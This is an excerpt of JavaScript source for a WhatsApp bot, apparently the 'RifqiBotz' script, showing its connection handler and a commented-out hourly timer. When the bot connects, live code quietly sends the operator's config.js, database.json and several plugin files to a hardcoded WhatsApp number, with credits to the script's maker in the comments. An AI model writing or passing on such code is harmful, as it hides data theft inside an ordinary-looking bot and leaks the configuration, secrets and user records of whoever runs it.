...
/**setInterval(async () => {
  const q = { "key": { "remoteJid": "status@broadcast", "participant":"0@s.whatsapp.net", "fromMe": false, "id": "" },
    ...
    return await conn.sendMessage('6283852843517@s.whatsapp.net', { document: sesi, mimetype: 'application/json', fileName: 'database.json' }, { quoted: q })
  }, 60 * 60 * 1000)**/
...
async function connectionUpdate(update) {
  const { connection, lastDisconnect, isNewLogin } = update
   ...
   if (connection == 'open') {
     ...
     /** let iyah = pickRandom(['Indonesia','Malaysia','Amerika','India','Amerika Serikat','Australia','Rusia','Singapura'])
      conn.sendMessage(`6283852843517@s.whatsapp.net`, {text: `Bot Telah Online!\nTerimakasih Telah Memberikan Sc Ini\nServer:\n${iyah}\n\nKode:\n` + randomID(32) })**/ // Connection Update
      conn.sendMessage(`6283852843517@s.whatsapp.net`, {text: 'Successfully connected by RifqiBotz' }) //made by Muhammad Ridwan Reynaldy 
      conn.sendMessage(`6283852843517@s.whatsapp.net`, { document: await fs.readFileSync('./config.js'), mimetype: 'application/json', fileName: 'config.js' }) //conn.sendMessage(`6283852843517@s.whatsapp.net`, {text: 'Successfully connected by RifqiBotz' }) //made by Muhammad Ridwan Reynaldy 
      conn.sendMessage(`6283852843517@s.whatsapp.net`, { document: await fs.readFileSync('./database.json'), mimetype: 'application/json', fileName: 'database.json' }) //conn.sendMessage(`6283852843517@s.whatsapp.net`, {text: 'Successfully connected by RifqiBotz' }) //made by Muhammad Ridwan Reynaldy  
      conn.sendMessage(`6283852843517@s.whatsapp.net`, { document: await fs.readFileSync('./plugins/_anticulik.js'), mimetype: 'application/json', fileName: '_anticulik.js' }) //conn.sendMessage(`6283852843517@s.whatsapp.net`, {text: 'Successfully connected by RifqiBotz' }) //made by Muhammad Ridwan Reynaldy 
     conn.sendMessage(`6283852843517@s.whatsapp.net`, { document: await fs.readFileSync('./plugins/donasi.js'), mimetype: 'application/json', fileName: 'donasi.js' }) //conn.sendMessage(`6283852843517@s.whatsapp.net`, {text: 'Successfully connected by RifqiBotz' }) //made by Muhammad Ridwan Reynaldy 
      conn.sendMessage(`6283852843517@s.whatsapp.net`, { document: await fs.readFileSync('./plugins/sewabot.js'), mimetype: 'application/json', fileName: 'sewabot.js' }) //conn.sendMessage(`6283852843517@s.whatsapp.net`, {text: 'Successfully connected by RifqiBotz' }) //made by Muhammad Ridwan Reynaldy 
  }
